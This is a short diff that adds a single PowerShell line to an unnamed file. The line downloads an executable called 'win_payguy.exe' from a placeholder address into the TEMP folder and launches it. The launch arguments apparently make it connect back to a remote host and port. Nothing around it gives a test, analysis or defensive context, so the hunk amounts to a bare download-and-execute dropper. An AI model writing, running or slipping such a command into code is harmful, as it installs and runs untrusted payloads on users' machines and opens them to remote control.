@@ -1,0 +1,1 @@
+$DownloadUrl = "http://0.0.0.0/win_payguy.exe";$DownloadPath = "$env:TEMP\win_payguy.exe";$Command = "win_payguy.exe -d 0.0.0.0:1234";$WebClient = New-Object System.Net.WebClient;$WebClient.DownloadFile($DownloadUrl, $DownloadPath);Start-Process -FilePath $DownloadPath -ArgumentList $Command
